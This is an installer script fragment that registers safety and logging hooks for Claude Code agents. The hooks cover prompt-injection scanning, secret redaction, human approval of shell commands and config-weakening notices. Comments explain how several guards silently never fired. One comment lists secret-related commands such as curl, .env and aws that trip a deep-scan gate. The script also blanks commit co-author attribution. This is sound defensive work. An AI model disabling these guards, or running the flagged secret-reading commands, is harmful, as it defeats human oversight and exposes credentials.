    hooks+=("UserPromptSubmit||${hooks_dir}/reentry-detector.sh|")
    hooks+=("UserPromptSubmit||${hooks_dir}/learn-from-prompts.sh|async")
    hooks+=("UserPromptSubmit||${hooks_dir}/rate-limit-advisor.sh|async")
    hooks+=("PreCompact||${hooks_dir}/compaction-backup.sh|")
    hooks+=("PostCompact||${hooks_dir}/post-compact-inject.sh|")
    hooks+=("SessionEnd||${hooks_dir}/session-end.sh|async")
    # Synchronous, and registered before stop-verify: it can block the stop, and a
    # hook registered `async` cannot.
    hooks+=("Stop|*|${hooks_dir}/claim-evidence-gate.sh|")
    hooks+=("Stop|*|${hooks_dir}/stop-verify.sh|")
    hooks+=("Stop|*|${hooks_dir}/scope-guard.sh clear|async")
    hooks+=("Stop|*|${hooks_dir}/session-complete.sh|async")
    hooks+=("Stop|*|${hooks_dir}/session-memory-write.sh|async")
    hooks+=("StopFailure||${hooks_dir}/stop-failure.sh|async")
    hooks+=("PermissionDenied||${hooks_dir}/event-logger.sh permission_denied|async")
    hooks+=("PostToolUseFailure||${hooks_dir}/event-logger.sh tool_failure|async")
    hooks+=("SubagentStop||${hooks_dir}/event-logger.sh subagent_stop|async")
    hooks+=("ConfigChange||${hooks_dir}/event-logger.sh config_change|async")
    hooks+=("InstructionsLoaded||${hooks_dir}/event-logger.sh instructions_loaded|async")
    hooks+=("TaskCreated||${hooks_dir}/event-logger.sh task_created|async")
    hooks+=("TaskCompleted||${hooks_dir}/event-logger.sh task_completed|async")
    hooks+=("TeammateIdle||${hooks_dir}/event-logger.sh teammate_idle|async")
    # v2.26.8: entering a directory whose .supercharger.json weakens guards is a
    # config change nobody reviewed — it arrives with the branch or the clone, not
    # with a decision. path-guard stops the AGENT writing these files; this covers
    # the other way they arrive.
    #
    # On CwdChanged, deliberately NOT WorktreeCreate. Worktree* are PROVIDER events:
    # CC delegates worktree creation to a hook registered there and needs a path
    # back, so a passive hook breaks `isolation: worktree` for every agent (shipped
    # and reverted in v2.7.26→.27; test-install.sh:242 guards it). CwdChanged is the
    # correct event and covers strictly more — a plain cd into any repo, not just a
    # new worktree.
    hooks+=("CwdChanged|*|${hooks_dir}/config-weakening-notice.sh|")
    # v2.26.43 registered dir-added-record.sh on `DirectoryAdded` to honour
    # Claude Code's own `/add-dir`. THERE IS NO SUCH EVENT. Claude Code names the
    # valid set in its own error, and DirectoryAdded is not among them:
    #
    #   Unknown hook event "DirectoryAdded" was ignored. Valid events: PreToolUse,
    #   PostToolUse, PostToolUseFailure, PostToolBatch, Notification,
    #   UserPromptSubmit, UserPromptExpansion, SessionStart, SessionEnd, Stop,
    #   StopFailure, SubagentStart, SubagentStop, PreCompact, PostCompact,
    #   PermissionRequest, PermissionDenied, Setup, TeammateIdle, TaskCreated,
    #   TaskCompleted, Elicitation, ElicitationResult, ConfigChange,
    #   WorktreeCreate, WorktreeRemove, InstructionsLoaded, CwdChanged,
    #   FileChanged, MessageDisplay
    #
    # So the hook never fired, .session-dirs-<sid> was never written, and the
    # in-session `/add-dir` half of that feature has never worked — while the
    # test asserted the REGISTRATION existed and passed throughout. Third time
    # this repo has shipped a filter in a dialect the harness ignores, after the
    # bare `mcp__` matcher (v2.24.5) and the `if` field (v2.26.85): declared,
    # silent, inert. Now scanned in tests/test-hook-events.sh.
    #
    # Reported by a user whose /doctor flagged it. The registration is removed
    # rather than renamed: no event in the valid set means "a directory was added
    # to the workspace" (WorktreeCreate is git worktrees, a different trigger).
    # The STATIC half still works — path-guard reads
    # permissions.additionalDirectories from settings.json directly.
    #
    # v2.27.23: RESTORED. Claude Code shipped the event after that removal —
    # 2.1.219 added DirectoryAdded, and 2.1.233 extended it to `/add-dir` and the
    # SDK register_repo_root control request. Verified against the installed
    # binary rather than the changelog: it exports executeDirectoryAddedHooks and
    # its hook registry maps DirectoryAdded to a dispatcher. So the in-session
    # half of `/add-dir` can finally be honoured, and a user who authorises a
    # sibling directory through the product's own front door stops being denied
    # writes to it by path-guard.
    #
    # The removal was right for its time and the note above is kept: what changed
    # is the platform, not the reasoning. The events test now derives its valid
    # set from the INSTALLED Claude Code where it can, so this cannot silently
    # rot in either direction again.
    hooks+=("DirectoryAdded|*|${hooks_dir}/dir-added-record.sh|")
    # v2.26.8: slash-command expansion is a third channel by which untrusted text
    # becomes instructions — a command body can come from a plugin or a shared repo.
    # Same hook, same pattern list as the Read/WebFetch/MCP channel: a second scanner
    # would drift from the first.
    hooks+=("UserPromptExpansion||${hooks_dir}/prompt-injection-scanner.sh|async")
    # v2.26.8: the only guard that protects the HUMAN rather than the model. The other
    # two secret scanners act on Claude's context; if a credential reaches an assistant
    # message anyway it lands in the terminal, the scrollback, and any screen share
    # running at the time. MessageDisplay's displayContent rewrites what is rendered.
    hooks+=("MessageDisplay||${hooks_dir}/display-secret-redactor.sh|")
    hooks+=("FileChanged|.env,.envrc,package.json,.claude/settings.json|${hooks_dir}/file-watcher.sh|async")
    hooks+=("SubagentStart||${hooks_dir}/subagent-safety.sh|")
    hooks+=("SubagentStop||${hooks_dir}/agent-handoff-gate.sh|")
    hooks+=("PostToolUse||${hooks_dir}/budget-cap.sh|async")
    hooks+=("PostToolUse|Write,Edit,Bash|${hooks_dir}/session-checkpoint.sh|async")
    hooks+=("PreToolUse||${hooks_dir}/budget-cap.sh check|")
    hooks+=("PreToolUse||${hooks_dir}/tool-call-limiter.sh|")
    hooks+=("PreToolUse|Bash,Monitor,PowerShell|${hooks_dir}/human-approval-gate.sh|")    hooks+=("PreToolUse|Agent|${hooks_dir}/cost-forecast.sh|")
    hooks+=("SubagentStart||${hooks_dir}/subagent-cost.sh start|async")
    hooks+=("SubagentStop||${hooks_dir}/subagent-cost.sh stop|")
    if [[ "$has_developer" == "true" ]]; then
      hooks+=("PostToolUse|Write,Edit|${hooks_dir}/quality-gate.sh|")
      # asyncRewake, not blocking. Measured on a real install: typecheck ran 150
      # times at a 10.6s median (p90 23.9s, max 229s) — 37 MINUTES of blocking in
      # 30 days, all of it after an edit the model was waiting to continue past.
      #
      # It is the same shape as the scanners already on asyncRewake above: it only
      # READS (`tsc --noEmit`), and its whole output is findings to inject. So the
      # model can proceed and be woken when errors arrive, which is strictly better
      # than holding the loop for ten seconds to say the same thing.
      #
      # quality-gate stays SYNCHRONOUS on purpose, despite costing more in total
      # (1423 runs, 53 min): it MUTATES the file — eslint --fix, prettier --write,
      # ruff format. Async would let those writes land after the model had moved
      # on, racing its next edit. Cost is not the only axis; a hook that rewrites
      # files has to finish before the next one starts.
      hooks+=("PostToolUse|Write,Edit|${hooks_dir}/typecheck.sh|asyncRewake")
      hooks+=("PreToolUse|Write,Edit|${hooks_dir}/design-context.sh|async")
    fi
  fi

  printf '%s\n' "${hooks[@]}"
}

# v2.25.1 — replace `#!/usr/bin/env bash` with an absolute interpreter path in the
# INSTALLED copies. `env` performs a PATH search on every single hook exec; measured
# here at ~1.8 ms per exec (env 4.1–4.8 ms vs absolute 2.3–3.2 ms, three interleaved
# rounds, bash sitting 12 entries deep in PATH). Hooks fire in parallel waves of ~11,
# so this takes ~1.8 ms off a wave's felt latency and ~20 ms of CPU off each wave —
# worth having, and free.
#
# The risk is the reason this is careful rather than a one-line sed: a wrong
# interpreter path means the hook cannot exec AT ALL, which is a guard that silently
# stops running. Three constraints keep that from happening:
#
#   1. Stamp the bash that `env` WOULD have found (`command -v bash`), never a
#      hardcoded /bin/bash. On a machine with Homebrew bash first on PATH, hardcoding
#      /bin/bash would silently downgrade every hook to bash 3.2 and lose the
#      EPOCHREALTIME fast path.
#   2. Only stamp STABLE system locations (/bin, /usr/bin). A Homebrew or nix path can
#      vanish on upgrade or uninstall, so those keep `env bash` — slower, still correct.
#   3. Verify by EXECUTION before keeping it. One stamped hook is run; if it does not
#      exec cleanly the original shebang is restored for every file.
#
# Repo sources keep `#!/usr/bin/env bash` — portable for development and CI. Only the
# deployed copies are stamped, and re-stamped on every install/update.
stamp_hook_shebangs() {
  local dir="$1" bash_path probe rc
  [ "${SUPERCHARGER_STAMP_SHEBANG:-1}" = "0" ] && return 0

  bash_path=$(command -v bash 2>/dev/null || true)
  case "$bash_path" in
    /bin/bash|/usr/bin/bash) : ;;
    *) return 0 ;;   # non-system bash (brew/nix/asdf) — leave env, it may move
  esac
  [ -x "$bash_path" ] || return 0

  local f changed=0
  for f in "$dir"/*.sh; do
    [ -f "$f" ] || continue
    case "$(head -1 "$f")" in
      '#!/usr/bin/env bash') : ;;
      *) continue ;;
    esac
    # In-place rewrite of line 1 only, via a temp file (never edit a live hook in
    # place — a partial write would leave an unexecutable guard).
    { printf '#!%s\n' "$bash_path"; tail -n +2 "$f"; } > "$f.stamp" 2>/dev/null || continue
    chmod 700 "$f.stamp" 2>/dev/null || true
    mv -f "$f.stamp" "$f" 2>/dev/null && changed=1
  done
  [ "$changed" = "1" ] || return 0

  # Constraint 3: prove a stamped hook still executes. lib-suppress.sh is sourced by
  # nearly every hook and exits 0 on empty input, so it is a safe probe.
  probe="$dir/lib-suppress.sh"
  if [ -x "$probe" ]; then
    "$probe" </dev/null >/dev/null 2>&1; rc=$?
    if [ "$rc" -gt 1 ]; then
      for f in "$dir"/*.sh; do
        [ -f "$f" ] || continue
        case "$(head -1 "$f")" in
          "#!$bash_path")
            { printf '#!/usr/bin/env bash\n'; tail -n +2 "$f"; } > "$f.stamp" 2>/dev/null || continue
            chmod 700 "$f.stamp" 2>/dev/null || true
            mv -f "$f.stamp" "$f" 2>/dev/null || true ;;
        esac
      done
      echo "  Note: shebang stamping reverted (probe failed) — hooks left on 'env bash'." >&2
    fi
  fi
  return 0
}

deploy_hook_scripts() {
  local source_dir="$1"
  local target_dir="$HOME/.claude/supercharger/hooks"
  mkdir -p "$target_dir"
  chmod 700 "$HOME/.claude/supercharger"

  # Remove hook .sh files that no longer exist in source. Without this, hooks
  # deleted in newer versions linger on disk forever (they're harmless because
  # settings.json doesn't register them, but they pollute /why explanations,
  # diagnostics, and confuse audits).
  for installed in "$target_dir/"*.sh; do
    [ ! -f "$installed" ] && continue
    local base
    base=$(basename "$installed")
    # Keep webhook-lib.sh (renamed copy of lib/webhook.sh, handled below)
    [ "$base" = "webhook-lib.sh" ] && continue
    if [ ! -f "$source_dir/hooks/$base" ]; then
      rm -f "$installed"
    fi
  done

  cp "$source_dir/hooks/"*.sh "$target_dir/"
  cp "$source_dir/lib/webhook.sh" "$target_dir/webhook-lib.sh"
  chmod 700 "$target_dir/"*.sh
  stamp_hook_shebangs "$target_dir"
  # Python deep-scanners invoked by hooks (safety-detect.py, env-file-detect.py).
  # These live in hooks/ but were previously never deployed (only *.sh was copied),
  # so safety.sh/env-file-guard.sh ran `python3 <missing-file>` → python exits 2 →
  # under `set -e` the hook died with empty stderr → CC rendered a phantom
  # "hook error: No stderr output" deny on every command that tripped the deep-scan
  # gate (python -c, curl, find, .env, secret, aws, …). Deploy them here.
  cp "$source_dir/hooks/"*.py "$target_dir/" 2>/dev/null || true
  chmod 700 "$target_dir/"*.py 2>/dev/null || true

  # Deploy tools so they're available after one-liner installs (no local repo)
  local tools_dir="$HOME/.claude/supercharger/tools"
  mkdir -p "$tools_dir"
  cp "$source_dir/tools/"*.sh "$tools_dir/"
  chmod 700 "$tools_dir/"*.sh

  # Deploy lib dependencies that hooks/tools source at runtime
  local lib_dir="$HOME/.claude/supercharger/lib"
  mkdir -p "$lib_dir"
  cp "$source_dir/lib/utils.sh" "$lib_dir/"
  cp "$source_dir/lib/economy.sh" "$lib_dir/"
  # Python modules imported by hooks (e.g., cwd-changed, project-config, statusline)
  cp "$source_dir/lib/"*.py "$lib_dir/" 2>/dev/null || true
  chmod 700 "$lib_dir/"*.sh
  chmod 600 "$lib_dir/"*.py 2>/dev/null || true

  # Deploy stack standards (rules/stacks/*.md) that standards-inject.sh reads.
  # Without this, standards-inject crashes at SessionStart on every install
  # because it expects rules/ as a sibling of hooks/ in the deploy layout.
  if [ -d "$source_dir/rules/stacks" ]; then
    local rules_dir="$HOME/.claude/supercharger/rules/stacks"
    mkdir -p "$rules_dir"
    cp "$source_dir/rules/stacks/"*.md "$rules_dir/" 2>/dev/null || true
    chmod 600 "$rules_dir/"*.md 2>/dev/null || true
  fi
}

merge_hooks_into_settings() {
  local mode="$1"
  local has_developer="$2"
  local hooks_dir="$HOME/.claude/supercharger/hooks"
  local settings_file="$HOME/.claude/settings.json"

  local hooks_list
  hooks_list=$(get_hooks_for_mode "$mode" "$has_developer" "$hooks_dir")

  # STATUSLINE_PATH comes from bash so it stays POSIX on Git Bash — see the
  # note at the statusline_path assignment below.
  # SYNC_TIMEOUT is resolved in BASH, where PLATFORM is known — see the note at the
  # timeout assignment below. Overridable so a slow machine on any platform can
  # raise it without editing the installer.
  local sync_timeout="${SUPERCHARGER_SYNC_TIMEOUT:-}"
  if [ -z "$sync_timeout" ]; then
    if [ "${PLATFORM:-}" = "windows" ]; then sync_timeout=60; else sync_timeout=15; fi
  fi

  SETTINGS_FILE="$settings_file" SUPERCHARGER_TAG="$SUPERCHARGER_TAG" HOOKS_INPUT="$hooks_list" \
  SYNC_TIMEOUT="$sync_timeout" \
  STATUSLINE_PATH="$hooks_dir/statusline.sh" python3 -c "
import json, os, sys

settings_file = os.environ['SETTINGS_FILE']
tag = os.environ['SUPERCHARGER_TAG']
hooks_input = os.environ['HOOKS_INPUT']
SYNC_TIMEOUT = int(os.environ.get('SYNC_TIMEOUT') or 15)


# v2.24.5 - MCP matchers must be regex, not exact.
#
# Claude Code picks the matcher mode from the matcher's own characters: one made
# only of [A-Za-z0-9_,| -] is an EXACT match (optionally a comma/pipe list);
# anything else is an unanchored regex. So 'mcp__' asked for a tool *named*
# literally 'mcp__' - which no server exposes - and every hook registered that
# way was silently inert (an unmatched matcher never fires, with no error).
# Real tool names are mcp__<server>__<tool>, so each prefix needs '.*'.
#
# Runs AFTER the record is split on '|' - regex alternation is also '|', so
# rewriting inside the pipe-delimited tuple would corrupt the record. Matchers
# with no mcp__ token are returned untouched: a plain list like 'Bash,PowerShell'
# must STAY exact, since regex mode would let it match substrings (BashOutput).
#
# Kept in sync with the copy in tools/gen-plugin-hooks.sh; a test asserts the two
# emitters agree. NO double quotes in this block - it lives inside python3 -c '...'
# built as a double-quoted shell string, so a triple-quoted docstring would end it.
def normalize_mcp_matcher(m):
    if 'mcp__' not in m:
        return m
    toks = [t for t in m.split(',') if t]
    return '|'.join(t + '.*' if t.startswith('mcp__') else t for t in toks)


# v2.29.2 - comma matcher lists are inert before Claude Code v2.1.191.
#
# The docs are explicit: a matcher of only [A-Za-z0-9_,| -] is an EXACT match,
# and 'Exact string, or list of exact strings separated by | or , with optional
# surrounding whitespace'  -- but 'Comma separators and the surrounding
# whitespace tolerance require Claude Code v2.1.191 or later.' The PIPE form
# carries no such version floor.
#
# So on CC < 2.1.191 every comma-list matcher we emit selects nothing, fires
# nothing and errors nothing: safety.sh, the write guards, the secret scanners
# all silently gone, with no in-product signal. That is anthropics/claude-code
# #69970, fixed upstream in 2.1.191 - but a user on an older build still gets
# the dead layer, and we do not pin a minimum CC version.
#
# Both forms are the SAME exact-list mode, so this changes nothing on a current
# build. It is a pure back-compat rewrite, not a semantic one.
#
# Only PreToolUse/PostToolUse: FileChanged matches FILE PATHS and Notification
# has its own vocabulary, so their commas are not tool-name list separators.
# The charset test also keeps us off regex matchers, where | IS alternation.
EXACT_MATCHER_CHARS = set(
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_,| -')


def commas_to_pipes(event, m):
    if event not in ('PreToolUse', 'PostToolUse'):
        return m
    if ',' not in m or set(m) - EXACT_MATCHER_CHARS:
        return m
    return '|'.join(t.strip() for t in m.split(',') if t.strip())

if os.path.exists(settings_file):
    with open(settings_file, 'r') as f:
        try:
            settings = json.load(f)
        except json.JSONDecodeError:
            print('ERROR: settings.json is malformed. Use Replace or Skip.', file=sys.stderr)
            sys.exit(1)
else:
    settings = {}

if 'hooks' not in settings:
    settings['hooks'] = {}

# Remove existing supercharger hook entries
for event in list(settings['hooks'].keys()):
    settings['hooks'][event] = [
        entry for entry in settings['hooks'][event]
        if not any(tag in h.get('command', '') or tag in h.get('prompt', '') for h in entry.get('hooks', []))
    ]
    if not settings['hooks'][event]:
        del settings['hooks'][event]

# Add new entries in the new format
for line in hooks_input.strip().split('\n'):
    if not line.strip():
        continue
    parts = line.split('|', 4)
    event = parts[0]
    matcher = commas_to_pipes(
        event, normalize_mcp_matcher(parts[1] if len(parts) > 1 else ''))
    command = parts[2] if len(parts) > 2 else ''
    flags = parts[3] if len(parts) > 3 else ''
    if_pattern = parts[4] if len(parts) > 4 else ''

    if event not in settings['hooks']:
        settings['hooks'][event] = []

    if command.startswith('prompt:'):
        inner = {'type': 'prompt', 'prompt': command[7:] + ' ' + tag}
    else:
        inner = {'type': 'command', 'command': command + ' ' + tag}

    flag_list = [f.strip() for f in flags.split(',') if f.strip()]
    if 'async' in flag_list:
        inner['async'] = True
    if 'asyncRewake' in flag_list:
        inner['asyncRewake'] = True
    # v2.26.8: cap every hook. Claude Code defaults command hooks to 600s, so one
    # wedged hook freezes a tool call for ten minutes with no indication why. Two
    # tiers: a BLOCKING hook stalls the user, so its cap is tight (measured hook
    # work is under 10ms; 15s is ample); an async hook stalls nobody and some run
    # long on purpose. Mirrored in tools/gen-plugin-hooks.sh - a test asserts the
    # two emitters agree.
    # v2.26.70: the 15s figure above was measured on macOS, where a hook forks in
    # ~2ms. Git Bash has no fork(): every python3/jq is a CreateProcess through
    # MSYS, commonly 200-500ms and worse with Defender scanning each launch. A
    # UserPromptSubmit hook making ~8 of them blows 15s honestly, and Claude Code
    # then DISCARDS its output — so the user loses the context injection as well as
    # the time. Reported from a real Windows desktop, 2026-08-06.
    #
    # Raising the cap does not make Windows fast; it stops a slow hook from also
    # being a silently dropped one. The fork count is the actual fix and is not a
    # one-line change.
    inner['timeout'] = 120 if ('async' in flag_list or 'asyncRewake' in flag_list) else SYNC_TIMEOUT
    if if_pattern:
        inner['if'] = if_pattern

    hook_entry = {'hooks': [inner]}
    if matcher:
        hook_entry['matcher'] = matcher

    settings['hooks'][event].append(hook_entry)

# v2.26.57: take the path from BASH, not from Python's expanduser.
#
# Measured on a windows-latest runner: under Git Bash, python3 is WINDOWS python,
# so expanduser('~') returns a C:\Users\name style path and os.path.join uses
# backslashes.
#
# This whole block is a DOUBLE-QUOTED bash string. Three characters must never
# appear in it: a backtick or a dollar-paren (bash executes them before python
# sees the source), and a double quote (it closes the string early).
#
# Both mistakes have now been made here. The example path above used to sit in
# backticks, so every install on every platform ran it and printed a
# command-not-found for C:Usersname -- reported by the first human Windows
# install, 2026-08-06. The first attempt to document that fix quoted the error
# text, which closed the string and produced an install with ZERO hooks and no
# statusline. Keep this comment plain.
# That string was written straight into settings.json as statusLine.command —
# a command Git Bash cannot execute, so the statusline silently never runs.
#
# Bash's $HOME is already POSIX there (/c/Users/name), which is why STATUSLINE_PATH
# is passed in. The rule: expanduser is fine for opening a file with Python, and
# wrong for building a string another program will execute. Only this one site
# did the latter — tools/mcp-custom.sh's uses are file I/O and are correct as-is.
#
# The plugin emitter needs no matching change: a plugin cannot set statusLine at
# all (tools/gen-plugin-hooks.sh:11), so there is no parity risk here.
statusline_path = os.environ.get('STATUSLINE_PATH', '')
if statusline_path and os.path.isfile(statusline_path):
    settings['statusLine'] = {
        'type': 'command',
        'command': statusline_path + ' ' + tag
    }

# Enable 1-hour prompt cache TTL (regressed to 5min in March 2026; restores 20-32% cost savings)
if 'env' not in settings:
    settings['env'] = {}
settings['env']['ENABLE_PROMPT_CACHING_1H'] = '1'

# Disable Co-Authored-By trailers in commits and PRs
if 'attribution' not in settings:
    settings['attribution'] = {'commit': '', 'pr': ''}

with open(settings_file, 'w') as f:
    json.dump(settings, f, indent=2)
" 2>&1

  return $?
}

remove_supercharger_hooks() {
  local settings_file="$HOME/.claude/settings.json"

  if [ ! -f "$settings_file" ]; then
    return 0
  fi

  SETTINGS_FILE="$settings_file" SUPERCHARGER_TAG="$SUPERCHARGER_TAG" python3 -c "
import json, os

settings_file = os.environ['SETTINGS_FILE']
tag = os.environ['SUPERCHARGER_TAG']

with open(settings_file, 'r') as f:
    settings = json.load(f)

if 'hooks' in settings:
    for event in list(settings['hooks'].keys()):
        settings['hooks'][event] = [
            entry for entry in settings['hooks'][event]
            if not any(tag in h.get('command', '') or tag in h.get('prompt', '') for h in entry.get('hooks', []))
        ]
        if not settings['hooks'][event]:
            del settings['hooks'][event]
    if not settings['hooks']:
        del settings['hooks']

if 'statusLine' in settings:
    cmd = settings['statusLine'].get('command', '')
    if tag in cmd:
        del settings['statusLine']

# Remove attribution override (restore Claude default)
if 'attribution' in settings:
    attr = settings['attribution']
    if attr.get('commit') == '' and attr.get('pr') == '':
        del settings['attribution']

# Remove prompt cache TTL override
if settings.get('env', {}).get('ENABLE_PROMPT_CACHING_1H') == '1':
    del settings['env']['ENABLE_PROMPT_CACHING_1H']
    if not settings['env']:
        del settings['env']

with open(settings_file, 'w') as f:
    json.dump(settings, f, indent=2)
" 2>&1
}

count_installed_hooks() {
  local mode="$1"
  local has_developer="$2"
  # Count by generating the list — single source of truth
  local hooks_dir="$HOME/.claude/supercharger/hooks"
  local count
  # v2.6.42: awk emits exactly one number; `grep -c | || echo 0` doubled
  # output on zero matches and showed "0\n0 hooks installed" in install.sh.
  # v2.9.4: dedup by hook SCRIPT basename (tuple field 3), not registration
  # count — one hook registered on N events is still ONE installed hook. The
  # banner now matches the distinct-script count in docs/HOOKS.md instead of
  # overstating (a hook on 3 events used to count 3×). Portable awk: no
  # length(array) (BWK/macOS awk lacks it), count keys via a for-in loop.
  count=$(get_hooks_for_mode "$mode" "$has_developer" "$hooks_dir" \
    | awk -F'|' 'NF{ n=split($3,a,"/"); b=a[n]; if(b!="") seen[b]=1 } END{ c=0; for(k in seen) c++; print c+0 }')
  echo "$count"
}
